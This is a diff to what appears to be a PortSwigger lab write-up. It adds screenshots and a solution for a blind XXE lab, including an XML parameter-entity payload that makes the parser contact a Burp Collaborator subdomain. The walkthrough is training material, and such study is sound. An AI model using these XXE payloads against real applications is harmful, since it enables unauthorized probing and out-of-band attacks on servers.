@@ -50,3 +50,28 @@ Replace the productId number with a reference to the external entity:
 &xxe;
 Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
 
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/8afc8214-9a2e-4d83-b374-cf2077bb0594)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/1df95350-7428-4192-b893-2aa38c5ee0d8)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/708a1c40-e077-46f2-9db4-6a5642732af1)
+
+**Lab: Blind XXE with out-of-band interaction via XML parameter entities**
+
+This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
+
+To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+
+Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
+Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
+
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/8df209cf-4144-4121-986f-fa9f7eb59494)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/73f1997e-a9ff-4226-ac36-6039d0a88b6a)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/94269059-7387-4362-a69f-e26947ca38a8)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/12bc1db7-bc89-4837-a888-298821baa798)
